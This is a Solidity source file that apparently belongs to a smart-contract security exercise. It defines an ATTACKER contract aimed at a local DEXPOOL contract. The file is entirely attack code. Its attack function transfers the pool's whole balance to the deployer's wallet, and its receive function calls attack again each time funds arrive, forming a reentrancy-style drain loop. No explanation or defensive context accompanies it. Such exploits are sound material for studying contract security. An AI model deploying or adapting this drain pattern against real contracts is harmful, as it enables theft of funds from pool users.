// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Dexpool.sol";

contract ATTACKER{
  DEXPOOL public dexpool;
  address public myWallet;

  constructor(DEXPOOL _dexpoolAddress) payable {
    dexpool = DEXPOOL(_dexpoolAddress);
    myWallet = payable(msg.sender);
    
  }
  function attack()  public payable {
    
    dexpool.transfer(myWallet, address(dexpool).balance);
  }
  function checkBalance() public view returns (uint256){
    return address(this).balance;
  }
  receive() payable external{
    attack();
  }
}